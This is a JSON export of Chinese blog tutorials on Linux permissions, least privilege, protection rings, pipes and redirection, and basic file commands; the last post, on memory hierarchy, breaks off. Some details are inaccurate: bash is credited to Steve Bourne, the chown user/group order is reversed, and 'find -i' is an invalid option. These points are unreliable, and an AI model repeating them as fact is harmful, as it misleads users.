权限划分","slug":"计操/Linux权限划分","date":"2021-07-17T17:23:57.000Z","updated":"2021-07-17T09:45:05.006Z","comments":true,"path":"2021/07/18/计操/Linux权限划分/","link":"","permalink":"https://www.shanghua.live/2021/07/18/%E8%AE%A1%E6%93%8D/Linux%E6%9D%83%E9%99%90%E5%88%92%E5%88%86/","excerpt":"","text":"权限抽象一个完整的权限管理体系，要有合理的抽象。这里就包括对用户、进程、文件、内存、系统调用等抽象。下面我将带你一一了解。 首先，我们先来说说用户和组。Linux 是一个多用户平台，允许多个用户同时登录系统工作。Linux 将用户抽象成了账户，账户可以登录系统，比如通过输入登录名 + 密码的方式登录；也可以通过证书的方式登录。 但为了方便分配每个用户的权限，Linux 还支持组 （Group）账户。组账户是多个账户的集合，组可以为成员们分配某一类权限。每个用户可以在多个组，这样就可以利用组给用户快速分配权限。 组的概念有点像微信群。一个用户可以在多个群中。比如某个组中分配了 10 个目录的权限，那么新建用户的时候可以将这个用户增加到这个组中，这样新增的用户就不必再去一个个目录分配权限。 而每一个微信群都有一个群主，Root 账户也叫作超级管理员，就相当于微信群主，它对系统有着完全的掌控。一个超级管理员可以使用系统提供的全部能力。 此外，Linux 还对文件进行了权限抽象（注意目录也是一种文件）。Linux 中一个文件可以设置下面 3 种权限： 读权限（r）：控制读取文件。 写权限（w）：控制写入文件。 执行权限（x）：控制将文件执行，比如脚本、应用程序等。 然后每个文件又可以从 3 个维度去配置上述的 3 种权限： 用户维度。每个文件可以所属 1 个用户，用户维度配置的 rwx 在用户维度生效； 组维度。每个文件可以所属 1 个分组，组维度配置的 rwx 在组维度生效； 全部用户维度。设置对所有用户的权限。 因此 Linux 中文件的权限可以用 9 个字符，3 组 rwx 描述：第一组是用户权限，第二组是组权限，第三组是所有用户的权限。然后用-代表没有权限。比如 rwxrwxrwx 代表所有维度可以读写执行。rw–wxr-x 代表用户维度不可以执行，组维度不可以读取，所有用户维度不可以写入。 通常情况下，如果用 ls -l 查看一个文件的权限，会有 10 个字符，这是因为第一个字符代表的是文件类型。，有管道文件、目录文件、链接文件等等。-代表普通文件、d 代表目录、p 代表管道。 四个问题 文件被创建后，初始的权限如何设置？ 需要全部用户都可以执行的指令，比如 ls，它们的权限如何分配？ 给一个文本文件分配了可执行权限会怎么样？ 可不可以多个用户都登录 root，然后只用 root 账户？ 问题一：初始权限问题一个文件创建后，文件的所属用户会被设置成创建文件的用户。谁创建谁拥有，这个逻辑很顺理成章。但是文件的组又是如何分配的呢？ 这里 Linux 想到了一个很好的办法，就是为每个用户创建一个同名分组。 比如说 zhang 这个账户创建时，会创建一个叫作 zhang 的分组。zhang 登录之后，工作分组就会默认使用它的同名分组 zhang。如果 zhang 想要切换工作分组，可以使用 newgrp 指令切换到另一个工作分组。因此，被创建文件所属的分组是当时用户所在的工作分组，如果没有特别设置，那么就属于用户所在的同名分组。 再说下文件的权限如何？文件被创建后的权限通常是： 1rw-rw-r-- 也就是用户、组维度不可以执行，所有用户可读。 问题二：公共执行文件的权限前面提到过可以用 which 指令查看 ls 指令所在的目录，我们发现在/usr/bin 中。然后用 ls -l 查看 ls 的权限，可以看到下图所示： 第一个-代表这是一个普通文件，后面的 rwx 代表用户维度可读写和执行； 第二个 r-x 代表组维度不可读写； 第三个 r-x 代表所有用户可以读和执行； 后两个 root，第一个代表所属用户，第二个代表所属分组。 如果一个文件设置为不可读，但是可以执行，那么结果会怎样？ 答案当然是不可以执行，无法读取文件内容自然不可以执行。 问题三：执行文件在 Linux 中，如果一个文件可以被执行，则可以直接通过输入文件路径（相对路径或绝对路径）的方式执行。如果想执行一个不可以执行的文件，Linux 则会报错。 当用户输入一个文件名，如果没有指定完整路径，Linux 就会在一部分目录中查找这个文件。你可以通过 echo $PATH 看到 Linux 会在哪些目录中查找可执行文件，PATH 是 Linux 的环境变量 问题四：可不可以都 root答案当然是不行，具体原因看下面 权限划分 到这里，用户和组相关权限就介绍完了。接下来说说内核和系统调用权限。 内核是操作系统连接硬件、提供最核心能力的程序。 内核提供操作硬件、磁盘、内存分页、进程等最核心的能力，并拥有直接操作全部内存的权限，因此内核不能把自己的全部能力都提供给用户，而且也不能允许用户通过 shell 指令进行系统调用。Linux 下内核把部分进程需要的系统调用以 C 语言 API 的形式提供出来。部分系统调用会有权限检查，比如说设置系统时间的系统调用。 以上我们看到了 Linux 对系统权限的抽象。接下来我们再说说权限架构的思想。 权限架构思想优秀的权限架构主要目标是让系统安全、稳定且用户、程序之间相互制约、相互隔离。这要求权限系统中的权限划分足够清晰，分配权限的成本足够低。 因此，优秀的架构，应该遵循最小权限原则（Least Privilege）。权限设计需要保证系统的安全和稳定。比如：每一个成员拥有的权限应该足够的小，每一段特权程序执行的过程应该足够的短。对于安全级别较高的时候，还需要成员权限互相牵制。比如金融领域通常登录线上数据库需要两次登录，也就是需要两个密码，分别掌握在两个角色手中。这样即便一个成员出了问题，也可以保证整个系统安全。 同样的，每个程序也应该减少权限，比如说只拥有少量的目录读写权限，只可以进行少量的系统调用。 权限划分此外，权限架构思想还应遵循一个原则，权限划分边界应该足够清晰，尽量做到相互隔离。Linux 提供了用户和分组。当然 Linux 没有强迫你如何划分权限，这是为了应对更多的场景。通常我们服务器上重要的应用，会由不同的账户执行。比如说 Nginx、Web 服务器、数据库不会执行在一个账户下。现在随着容器化技术的发展，我们甚至希望每个应用独享一个虚拟的空间，就好像运行在一个单独的操作系统中一样，让它们互相不用干扰。 下面我们就来说说 root 的危害。 举个例子，你有一个 MySQL 进程执行在 root（最大权限）账户上，如果有黑客攻破了你的 MySQL 服务，获得了在 MySQL 上执行 SQL 的权限，那么，你的整个系统就都暴露在黑客眼前了。这会导致非常严重的后果。 黑客可以利用 MySQL 的 Copy From Prgram 指令为所欲为，比如先备份你的关键文件，然后再删除他们，并要挟你通过指定账户打款。如果执行最小权限原则，那么黑客即便攻破我们的 MySQL 服务，他也只能获得最小的权限。当然，黑客拿到 MySQL 权限也是非常可怕的，但是相比拿到所有权限，这个损失就小多了。 分级保护因为内核可以直接操作内存和 CPU，因此非常危险。驱动程序可以直接控制摄像头、显示屏等核心设备，也需要采取安全措施，比如防止恶意应用开启摄像头盗用隐私。通常操作系统都采取一种环状的保护模式。 如上图所示，内核在最里面，也就是 Ring 0。 应用在最外面也就是 Ring 3。驱动在中间，也就是 Ring 1 和 Ring 2。对于相邻的两个 Ring，内层 Ring 会拥有较高的权限，可以改变外层的 Ring；而外层的 Ring 想要使用内层 Ring 的资源时，会有专门的程序（或者硬件）进行保护。 比如说一个 Ring3 的应用需要使用内核，就需要发送一个系统调用给内核。这个系统调用会由内核进行验证，比如验证用户有没有足够的权限，以及这个行为是否安全等等。 权限包围（Privilege Bracking）之前我们讨论过，当 MySQL 跑在 root 权限时，如果 MySQLl 被攻破，整个机器就被攻破了。因此我们所有应用都不要跑在 root 上。如果所有应用都跑在普通账户下，那么就会有临时提升权限的场景。比如说安装程序可能需要临时拥有管理员权限，将应用装到/usr/bin 目录下。 Linux 提供了权限包围的能力。比如一个应用，临时需要高级权限，可以利用交互界面（比如让用户输入 root 账户密码）验证身份，然后执行需要高级权限的操作，然后马上恢复到普通权限工作。这样做可以减少应用在高级权限的时间，并做到专权专用，防止被恶意程序利用。 用户分组指令上面我们讨论了 Linux 权限的架构，接下来我们学习一些具体的指令。 查看如果想查看当前用户的分组可以使用 groups 指令。 上面指令列出当前用户的所有分组。第一个是同名的主要分组，后面从 adm 开始是次级分组。 我先给你介绍两个分组，其他分组你可以去查资料： adm 分组用于系统监控，比如/var/log 中的部分日志就是 adm 分组。 sudo 分组用户可以通过 sudo 指令提升权限。 如果想查看当前用户，可以使用 id 指令，如下所示： uid 是用户 id； gid 是组 id； groups 后面是每个分组和分组的 id。 如果想查看所有的用户，可以直接看/etc/passwd。 /etc/passwd 这个文件存储了所有的用户信息，如下图所示： 创建用户1sudo useradd foo sudo 原意是 superuser do，后来演变成用另一个用户的身份去执行某个指令。如果没有指定需要 sudo 的用户，就可以像上面那样，以超级管理员的身份。因为 useradd 需要管理员身份。这句话执行后，会进行权限提升，并弹出输入管理员密码的输入界面。 创建分组创建分组用 groupadd 指令。下面指令创建一个叫作 hello 的分组。 1sudo groupadd hello 为用户增加次级分组组分成主要分组（Primary Group）和次级分组（Secondary Group）。主要分组只有 1 个，次级分组可以有多个。如果想为用户添加一个次级分组，可以用 usermod 指令。下面指令将用户 foo 添加到 sudo 分组，从而 foo 拥有了 sudo 的权限。 1sudo usermod -a -G sudo foo -a 代表 append，-G 代表一个次级分组的清单， 最后一个 foo 是账户名。 修改用户主要分组修改主要分组还是使用 usermod 指令。只不过参数是小写的-g。 1sudo usermod -g somegroup foo 文件权限管理指令接下来我们学习文件管理相关的指令。 查看我们可以用 ls -l 查看文件的权限，相关内容在文章 进程重定向管道 已经介绍过了。 修改文件权限可以用 chmod 修改文件权限，chmod（ change file mode bits），也就是我们之前学习的 rwx，只不过 rwx 在 Linux 中是用三个连在一起的二进制位来表示。 123456# 设置foo可以执行chmod +x ./foo# 不允许foo执行chmod -x ./foo# 也可以同时设置多个权限chmod +rwx ./foo 因为 rwx 在 Linux 中用相邻的 3 个位来表示。比如说 111 代表 rwx，101 代表 r-x。而 rwx 总共有三组，分别是用户权限、组权限和全部用户权限。也就是可以用 111111111 9 个 1 代表 rwxrwxrwx。又因为 11110 进制是 7，因此当需要一次性设置用户权限、组权限和所有用户权限的时候，我们经常用数字表示。 1234# 设置rwxrwxrwx (111111111 -&gt; 777)chmod 777 ./foo# 设置rw-rw-rw-(110110110 -&gt; 666)chmod 666 ./foo 修改文件所属用户有时候我们需要修改文件所属用户，这个时候会使用 chown 指令。 下面指令修改 foo 文件所属的用户为 bar。 1chown bar ./foo 还有一些情况下，我们需要同时修改文件所属的用户和分组，比如我们想修改 foo 的分组位 g，用户为 u，可以使用： 1chown g.u ./foo 总结Linux 权限划分的原则为 Linux 遵循最小权限原则。 Linux 遵循最小权限原则。 每个用户掌握的权限应该足够小，每个组掌握的权限也足够小。实际生产过程中，最好管理员 权限可以拆分，互相牵制防止问题。 每个应用应当尽可能小的使用权限。最理想的是每个应用单独占用一个容器（比如 Docker） ，这样就不存在互相影响的问题。即便应用被攻破，也无法攻破 Docker 的保护层。 尽可能少的 root。如果一个用户需要 root 能力，那么应当进行权限包围——马上提升权限- （比如 sudo），处理后马上释放权限。 系统层面实现权限分级保护，将系统的权限分成一个个 Ring，外层 Ring 调用内层 Ring - 时需要内层 Ring 进行权限校验。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"管道指令","slug":"计操/管道指令","date":"2021-07-17T15:15:38.000Z","updated":"2021-07-17T09:23:13.073Z","comments":true,"path":"2021/07/17/计操/管道指令/","link":"","permalink":"https://www.shanghua.live/2021/07/17/%E8%AE%A1%E6%93%8D/%E7%AE%A1%E9%81%93%E6%8C%87%E4%BB%A4/","excerpt":"","text":"进程我们知道，应用的可执行文件是放在文件系统里，把可执行文件启动，就会在操作系统里（具体来说是内存中）形成一个应用的副本，这个副本就是进程。 _进程是应用的执行副本；而不要回答进程是操作系统分配资源的最小单位。前者是定义，后者是作用_。 ps如果你要看当前的进程，可以用 ps 指令。p 代表 processes，也就是进程；s 代表 snapshot，也就是快照。所谓快照，就是像拍照一样。 如上图所示，我启动了两个进程，ps 和 zsh。ps 就是我刚刚启动的，被 ps 自己捕捉到了；zsh 是因为我开了这个控制台，执行的 shell 是 zsh。 当然操作系统也不可能只有这么几个进程，这是因为不带任何参数的 ps 指令显示的是同一个电传打字机（TTY 上）的进程。TTY 这个概念是一个历史的概念，过去用来传递信息，现在已经被传真、邮件、微信等取代。 操作系统上的 TTY 是一个输入输出终端的概念，比如用户打开 bash，操作系统就为用户分配了一个输入输出终端。没有加任何参数的 ps 只显示在同一个 TTY 的进程。 如果想看到所有的进程，可以用 ps -e，-e 没有特殊含义，只是为了和-A 区分开。我们通常不直接用 ps -e 而是用 ps -ef，这是因为-f 可以带上更多的描述字段，如下图所示： UID 指进程的所有者； PID 是进程的唯一标识； PPID 是进程的父进程 ID； C 是 CPU 的利用率（就是 CPU 占用）； STIME 是开始时间； TTY 是进程所在的 TTY，如果没有 TTY 就是 ？号； TIME 时间； CMD 是进程启动时的命令，如果不是一个 Shell 命令，而是用方括号括起来，那就是系统进程或者内核过程。 另外一个用得比较多的是 ps aux，它和 ps -ef 能力差不多，但是是 BSD 风格的。就是加州伯克利分校研发的 Unix 分支版本的衍生风格，如下 top另外还有一个和 ps 能力差不多，但是显示的不是快照而是实时更新数据的 top 指令。因为自带的 top 显示的内容有点少， 所以我喜欢用一个叫作 htop 的指令，htop 需要另外安装 管道管道（Pipeline）的作用是在命令和命令之间，传递数据。比如说一个命令的结果，就可以作为另一个命令的输入。我们了解了进程，所以这里说的命令就是进程。更准确地说，管道在进程间传递数据。 输入输出流每个进程拥有自己的标准输入流、标准输出流、标准错误流。这几个标准流说起来很复杂，但其实都是文件。 标准输入流（用 0 表示）可以作为进程执行的上下文（进程执行可以从输入流中获取数据） 标准输出流（用 1 表示）中写入的结果会被打印到屏幕上。 如果进程在执行过程中发生异常，那么异常信息会被记录到标准错误流（用 2 表示）中。 重定向我们执行一个指令，比如 ls -l，结果会写入标准输出流，进而被打印。这时可以用重定向符将结果重定向到一个文件，比如说 ls -l &gt; out，这样 out 文件就会有 ls -l 的结果；而屏幕上也不会再打印 ls -l 的结果。 具体来说 &gt; 符号叫作覆盖重定向；&gt;&gt; 叫作追加重定向。&gt; 每次都会把目标文件覆盖，&gt;&gt; 会在目标文件中追加。比如你每次启动一个程序日志都写入 /var/log/somelogfile 中，可以这样操作，如下所示： 1start.sh &gt;&gt; /var/log/somelogfile 经过这样的操作后，每次执行程序日志就不会被覆盖了。另外还有一种情况，比如我们输入: 1ls1 &gt; out 结果并不会存入 out 文件，因为 ls1 指令是不存在的。结果会输出到标准错误流中，仍然在屏幕上。这里我们可以把标准错误流也重定向到标准输出流，然后再重定向到文件。 1ls1 &amp;&gt; out 这个写法等价于： 1ls1 &gt; out 2&gt;&amp;1 管道的作用和分类有了进程和重定向的知识，接下来我们梳理下管道的作用。管道（Pipeline）将一个进程的输出流定向到另一个进程的输入流，就像水管一样，作用就是把这两个文件接起来。如果一个进程输出了一个字符 X，那么另一个进程就会获得 X 这个输入。 管道和重定向很像，但是管道是一个连接一个进行计算，重定向是将一个文件的内容定向到另一个文件，这二者经常会结合使用。 Linux 中的管道也是文件，有两种类型的管道： 匿名管道（Unnamed Pipeline），这种管道也在文件系统中，但是它只是一个存储节点，不属于任何一个目录。说白了，就是没有路径。 命名管道（Named Pipeline），这种管道就是一个文件，有自己的路径。 FIFO管道具有 FIFO（First In First Out），FIFO 和排队场景一样，先排到的先获得。所以先流入管道文件的数据，也会先流出去传递给管道下游的进程。 使用场景分析接下来我们以多个场景举例帮助你深入学习管道。 排序比如我们用 ls，希望按照文件名排序倒序，可以使用匿名管道，将 ls 的结果传递给 sort 指令去排序。你看，这样 ls 的开发者就不用关心排序问题了。 去重另一个比较常见的场景是去重，比如有一个字典文件，里面都是词语。如下所示： 12345AppleBananaAppleBanana…… 如果我们想要去重可以使用 uniq 指令，uniq 指令能够找到文件中相邻的重复行，然后去重。但是我们上面的文件重复行是交替的，所以不可以直接用 uniq，因此可以先 sort 这个文件，然后利用管道将 sort 的结果重定向到 uniq 指令。指令如下： 筛选有时候我们想根据正则模式筛选对应的内容。比如说我们想找到项目文件下所有文件名中含有 Spring 的文件。就可以利用 grep 指令，操作如下： 1find ./ | grep Spring find ./递归列出当前目录下所有目录中的文件。grep 从 find 的输出流中找出含有 Spring 关键字的行。 如果我们希望包含 Spring 但不包含 MyBatis 就可以这样操作： 1find ./ | grep Spring | grep -v MyBatis grep -v 是匹配不包含 MyBatis 的结果。 数行数还有一个比较常见的场景是数行数。比如你写了一个 Java 文件想知道里面有多少行，就可以使用 wc -l 指令，如下所示： 但是如果你想知道当前目录下有多少个文件，可以用 ls | wc -l，如下所示： 中间结果管道一个接着一个，是一个计算逻辑。有时候我们想要把中间的结果保存下来，这就需要用到 tee 指令。tee 指令从标准输入流中读取数据到标准输出流。 别急，tee 还有一个能力，就是自己利用这个过程把输入流中读取到的数据存到文件中。比如下面这条指令： 1find ./ -i &quot;*.java&quot; | tee JavaList | grep Spring 这句指令的意思是从当前目录中找到所有含有 Spring 关键字的 Java 文件。tee 本身不影响指令的执行，但是 tee 会把 find 指令的结果保存到 JavaList 文件中。 tee 这个执行就像英文字母中的 T 一样，连通管道两端，下面又开了口。这个开口，在函数式编程里面叫作副作用。 xargs上面我们学习的内容难度，已经由小学 1 年级攀升到了小学 6 年级，最后我们来看看初中难度的 xargs 指令。 xargs 指令从标准数据流中构造并执行一行行的指令。xargs 从输入流获取字符串，然后利用空白、换行符等切割字符串，在这些字符串的基础上构造指令，最后一行行执行这些指令。 举个例子，如果我们重命名当前目录下的所有 .a 的文件，想在这些文件前面加一个前缀 prefix_。比如说 x.a 文件需要重命名成 prefix_x.a，我们就可以用 xargs 指令构造模块化的指令。 现在我们有 x.a y.a z.a 三个文件，如下图所示： 然后使用下图中的指令构造我们需要的指令： 我们用 ls 找到所有的文件； -I 参数是查找替换符，这里我们用 GG 替代 ls 找到的结果；-I GG 后面的字符串 GG - 会被替换为 x.a``x.b 或 x.z； echo 是一个在命令行打印字符串的指令。使用 echo 主要是为了安全，帮助我们检查指令是否有错误。 我们用 xargs 构造了 3 条指令。这里我再多讲一个词，叫作样板代码。如果你没有用 xargs 指令，而是用一条条 mv 指令去敲，这样就构成了样板代码。 最后去掉 echo，就是我们想要的结果，如下所示： 管道文件上面我们花了较长的一段时间讨论匿名管道，用|就可以创造和使用。匿名管道也是利用了文件系统的能力，是一种文件结构。当你学到模块六文件系统的内容，会知道匿名管道拥有一个自己的 inode，但不属于任何一个文件夹。 还有一种管道叫作命名管道（Named Pipeline）。命名管道是要挂到文件夹中的，因此需要创建。用 mkfifo 指令可以创建一个命名管道，下面我们来创建一个叫作 pipe1 的命名管道，如下图所示： 命名管道和匿名管道能力类似，可以连接一个输出流到另一个输入流，也是 First In First Out。 当执行 cat pipe1 的时候，你可以观察到，当前的终端处于等待状态。因为我们 cat pipe1 的时候 pipe1 中没有内容。 如果这个时候我们再找一个终端去写一点东西到 pipe 中，比如说: 1echo &quot;XXX&quot; &gt; pipe1 这个时候，cat pipe1 就会返回，并打印出 xxx，如下所示： 我们可以像上图那样演示这段程序，在 cat pipe1 后面增加了一个&amp;符号。这个&amp;符号代表指令在后台执行，不会阻塞用户继续输入。然后我们通过 echo 指令往 pipe1 中写入东西，接着就会看到 xxx 被打印出来。 总结xargs 将标准输入流中的字符串分割成一条条子字符串，然后再按照我们自己想要的方式构建成一条条指令，大大拓展了 Linux 指令的能力。 比如我们可以用来按照某种特定的方式逐个处理一个目录下所有的文件；根据一个 IP 地址列表逐个 ping 这些 IP，收集到每个 IP 地址的延迟等。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"目录结构和文件管理指令","slug":"计操/目录结构和文件管理指令","date":"2021-07-15T15:55:50.000Z","updated":"2021-07-17T07:00:17.168Z","comments":true,"path":"2021/07/15/计操/目录结构和文件管理指令/","link":"","permalink":"https://www.shanghua.live/2021/07/15/%E8%AE%A1%E6%93%8D/%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E5%92%8C%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E6%8C%87%E4%BB%A4/","excerpt":"","text":"什么是 Shell在我们学习 Linux 指令之前，先来说一下什么是 Shell？Shell 把我们输入的指令，传递给操作系统去执行，所以 Shell 是一个命令行的用户界面。 早期程序员没有图形界面用，就用 Shell。而且图形界面制作成本较高，不能实现所有功能，因此今天的程序员依然在用 Shell。 你平时还经常会看到一个词叫作 bash（Bourne Again Shell），它是用 Shell 组成的程序。这里的 Bourne 是一个人名，Steve Bourne 是 bash 的发明者。 我们今天学习的所有指令，不是写死在操作系统中的，而是一个个程序。比如 rm 指令，你可以用 which 指令查看它所在的目录。如下图所示，你会发现 rm 指令在/usr/bin/rm 目录中。 shanghua 是我的名字，ubuntu 是机器的名字，我输入了 which rm，然后获得了/usr/bin/rm 的结果，最终执行这条指令的是操作系统，连接我和操作系统的程序就是 Shell。 Linux 对文件目录的抽象Linux 对文件进行了一个树状的抽象。/代表根目录，每一节目录也用/分开，所以在上图所展示的/usr/bin/rm 中，第一级目录是/根目录，第二级目录是 usr 目录，第三级是 bin 目录。最后的 rm 是一个文件。 路径（path）像/usr/bin/rm 称为可执行文件 rm 的路径。路径就是一个文件在文件系统中的地址。如果文件系统是树形结构，那么通常一个文件只有一个地址（路径）。 目标文件的绝对路径（Absolute path），也叫作完全路径（full path），是从/开始，接下来每一层都是一级子目录，直到定位到目标文件为止。 如上图所示的例子中，/usr/bin/rm 就是一个绝对路径。 工作目录为了方便你工作，Shell 还抽象出了工作目录。当用户打开 Shell 的时候，Shell 就会给用户安排一个工作目录。因此也就产生了相对路径。 相对路径（Relative path）是以工作目录为基点的路径。比如： 当用户在/usr 目录下的时候，rm 文件的相对路径就是 bin/rm 如果用户在/usr/bin 目录下的时候，rm 文件的路径就是./rm 或者 rm，这里用.代表当前目录； 如果用户在/usr/bin/somedir 下，那么 rm 的相对路径就是../rm，这里用..代表上一级目录。 我们使用 cd（change directory）指令切换工作目录，既可以用绝对路径，也可以用相对路径。 这里我要强调几个注意事项： 输入 cd，不带任何参数会切换到用户的家目录，Linux 中通常是/home/{用户名}。以我自己为例，我的家目录是/home/ramroll； 输入 cd .什么都不会发生，因为.代表当前目录； 输入 cd..会回退一级目录，因为..代表上级目录。 利用上面这 3 种能力，你就可以方便的构造相对路径了。 Linux 提供了一个指令 pwd（Print Working Directory）查看工作目录。下图是我输入 pwd 的结果。 你可以看到我正在/home/shanghua 目录下工作。 另一方面，Linux 下的目录也是一种文件；但是文件也不只有目录和可执行文件两种。常见的文件类型有以下 7 种: 普通文件（比如一个文本文件）； 目录文件（目录也是一个特殊的文件，它用来存储文件清单，比如/也是一个文件）； 可执行文件（上面的 rm 就是一个可执行文件）； 管道文件（管道文件）； Socket 文件（网络 Socket 文件）； 软链接文件（相当于指向另一个文件所在路径的符号）； 硬链接文件（相当于指向另一个文件的指针） 你如果使用 ls -F 就可以看到当前目录下的文件和它的类型。 - 结尾的是可执行文件； = 结尾的是 Socket 文件； @ 结尾的是软链接； | 结尾的管道文件； 没有符号结尾的是普通文件； / 结尾的是目录。 设备文件Socket 是网络插座，是客户端和服务器之间同步数据的接口。其实，Linux 不只把 Socket 抽象成了文件，设备基本也都被抽象成了文件。因为设备需要不断和操作系统交换数据。而交换方式只有两种——读和写。所以设备是可以抽象成文件的，因为文件也支持这两种操作。 Linux 把所有的设备都抽象成了文件，比如说打印机、USB、显卡等。这让整体的系统设计变得高度统一。 至此，我们了解了 Linux 对文件目录的抽象，接下来我们看看具体的增删改查指令。 文件的增删改查创建一个普通文件的方法有很多，最常见的有 touch 指令。比如下面我们创建了一个 a.txt 文件。 touch 指令本来是用来更改文件的时间戳的，但是如果文件不存在 touch 也会帮助创建一个空文件。 如果你拿到一个指令不知道该怎么用，比如 touch，你可以用 man touch 去获得帮助。man 意思是 manual，就是说明书的意思，这里指的是系统的手册。如果你不知道 man 是什么，也可以使用 man man。下图是使用 man man 的结果： 另外如果我们需要增加一个目录，就需要用到 mkdir 指令（ make directory），比如我们创建一个 hello 目录，如下图所示： 查看 我们看到在当前的目录下有一个 a.txt 文件，还有一个 hello 目录。如果你知道当前的工作目录，就可以使用 pwd 指令。 如果想看到 a.txt 更完善的信息，还可以使用 ls -l。-l 是 ls 指令的可选参数。下图是 ls -l 的结果，你可以看到 a.txt 更详细的描述。 如上图所示，我们看到两个 shanghua，它们是 a.txt 所属的用户和所属的用户分组，刚好重名了。Sep 13 是日期。 中间有一个 0 是 a.txt 的文件大小，目前 a.txt 中还没有写入内容，因此大小是 0。 另外虽然 hello 是空的目录，但是目录文件 Linux 上来就分配了 4096 字节的空间。这是因为目录内需要保存很多文件的描述信息。 删除如果我们想要删除 a.txt 可以用 rm a.txt；如我们要删除 hello 目录，可以用 rm hello。rm 是 remove 的缩写。 但是当我们输入 rm hello 的时候，会提示 hello 是一个目录，不可以删除。因此我们需要增加一个可选项，比如-r 即 recursive（递归）。目录是一个递归结构，所以需要用递归删除。最后，你会发现 rm hello -r 删除了 hello 目录。 接下来我们尝试在 hello 目录下新增一个文件，比如相对路径是 hello/world/os.txt。需要先创建 hello/world 目录。这种情况会用到 mkdir 的-p 参数，这个参数控制 mkdir 当发现目标目录的父级目录不存在的时候会递归的创建。以下是我们的执行结果： 修改如果需要修改一个文件，可以使用 nano 或者 vi 编辑器。类似的工具还有很多，但是 nano 和 vi 一般是 linux 自带的。 查阅文件内容我们知道，Linux 下查阅文件内容，可以根据不同场景选择不同的指令。 当文件较小时，比如一个配置文件，想要快速浏览这个文件，可以用 cat 指令。下面 cat 指令帮助我们快速查看/etc/hosts 文件。cat 指令将文件连接到标准输出流并打印到屏幕上。 标准输出流（Standard Output）也是一种文件，进程可以将要输出的内容写入标准输出流文件，这样就可以在屏幕中打印。 如果用 cat 查看大文件，比如一个线上的日志文件，因为动辄有几个 G，控制台打印出所有的内容就要非常久，而且刷屏显示看不到东西。 而且如果在线上进行查看大文件的操作，会带来不必要的麻烦： 首先因为我们需要把文件拷贝到输入输出流，这需要花费很长时间，这个过程会占用机器资源； 其次，本身文件会读取到内存中，这时内存被大量占用，很危险，这可能导致其他应用内存不足。因此我们需要一些不用加载整个文件，就能查看文件内容的指令。 moremore 可以帮助我们读取文件，但不需要读取整个文件到内存中。本身 more 的定位是一个阅读过滤器，比如你在 more 里除了可以向下翻页，还可以输入一段文本进行搜索。 如上图所示，我在 more 查看一个 nginx 日志后，先输入一个/，然后输入 192.168 看到的结果。more 帮我找到了 192.168 所在的位置，然后又帮我定位到了这个位置。整个过程 more 指令只读取我们需要的部分到内存中。 lessless 是一个和 more 功能差不多的工具，打开 man 能够看到 less 的介绍上写着自己是 more 的反义词（opposite of more）。这样你可以看出 linux 生态其实也是很自由的一个生态，在这里创造工具也可以按照自己的喜好写文档。less 支持向上翻页，这个功能 more 是做不到的。所以现在 less 用得更多一些。 head/tailhead 和 tail 是一组，它们用来读取一个文件的头部 N 行或者尾部 N 行。比如一个线上的大日志文件，当线上出了 bug，服务暂停的时候，我们就可以用 tail -n 1000 去查看最后的 1000 行日志文件，寻找导致服务异常的原因。 另一个比较重要的用法是，如果你想看一个实时的 nginx 日志，可以使用 tail -f 文件名，这样你会看到用户的请求不断进来。查一下 man，你会发现-f 是 follow 的意思，就是文件追加的内容会跟随输出到标准输出流。 grep有时候你需要查看一个指定 ip 的 nginx 日志，或者查看一段时间内的 nginx 日志。如果不想用 less 和 more 进入文件中去查看，就可以用 grep 命令。Linux 的文件命名风格都很短，所以也影响了很多人，比如之前我看到过一个大牛的程序，变量名从来不超过 5 个字母，而且都有意义。 grep 这个词，我们分成三段来看，是 g|re|p。 g 就是 global，全局； re 就是 regular expression，正则表达式； p 就是 pattern，模式。 所以这个指令的作用是通过正则表达式全局搜索一个文件找到匹配的模式。我觉得这种命名真的很牛，软件命名也是一个世纪难题，grep 这个名字不但发音不错，而且很有含义，又避免了名字过长，方便记忆。 下面我们举两个例子看看 grep 的用法： 例 1：查找 ip 地址 我们可以通过 grep 命令定位某个 ip 地址的用户都做了什么事情，如下图所示： 例 2：查找时间段的日志 我们可以通过 grep 命令查找某个时间段内用户都做了什么事情。如下图所示，你可以看到在某个 19 分钟所有用户的访问情况。 查找文件用户经常还会有一种诉求，就是查找文件。 之前我们使用过一个 which 指令，这个指令可以查询一个指令文件所在的位置，比如 which grep 会，你会看到 grep 指令被安装的位置是/usr/bin。但是我们还需要一个更加通用的指令查找文件，也就是 find 指令。 findfind 指令帮助我们在文件系统中查找文件。 比如我们如果想要查找所有.txt 扩展名的文件，可以使用 find . -iname “*.txt”，-iname 这个参数是用来匹配查找的，i 字母代表忽略大小写，这里也可以用-name 替代。输入这条指令，你会看到不断查找文件，如下图所示： 总结 pwd 指令查看工作目录。 cd 指令切换工作目录。 which 指令查找一个执行文件所在的路径。 ls 显示文件信息。 rm 删除文件。 touch 修改一个文件的时间戳，如果文件不存在会触发创建文件。 vi 和 nano 可以用来编辑文件。 cat 查看完成的文件适合小型文件。 more``less 查看一个文件但是只读取用户看到的内容到内存，因此消耗资源较少，适合在服- 务器上看日志。 head``tail 可以用来看文件的头和尾。 grep 指令搜索文件内容。 find 指令全局查找文件。 在这里，我再强调一个指令，即 man 指令，它是所有指令的手册，所以你一定要多多运用，熟练掌握。另外，一个指令通常有非常多的参数，但都需要用 man 指令去仔细研究。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"存储器分级","slug":"计操/存储器分级","date":"2021-07-15T15:27:13.000Z","updated":"2021-07-15T07:44:46.764Z","comments":true,"path":"2021/07/15/计操/存储器分级/","link":"","permalink":"https://www.shanghua.live/2021/07/15/%E8%AE%A1%E6%93%8D/%E5%AD%98%E5%82%A8%E5%99%A8%E5%88%86%E7%BA%A7/","excerpt":"","text":"为什么会有存储器分级策略？要想弄清楚存储器分级策略。首先，你要弄清楚，“我们希望存储器是什么样子的”，也就是“我们的需求是什么”？然后，你要弄清楚，我们的需求有哪些“实现约束”。从需求上讲，我们希望存储器速度快、体积小、空间大、能耗低、散热好、断电数据不丢失。但在现实中，我们往往无法把所有需求都实现。 下面我们举几个例子，带你深入体会一下，比如： 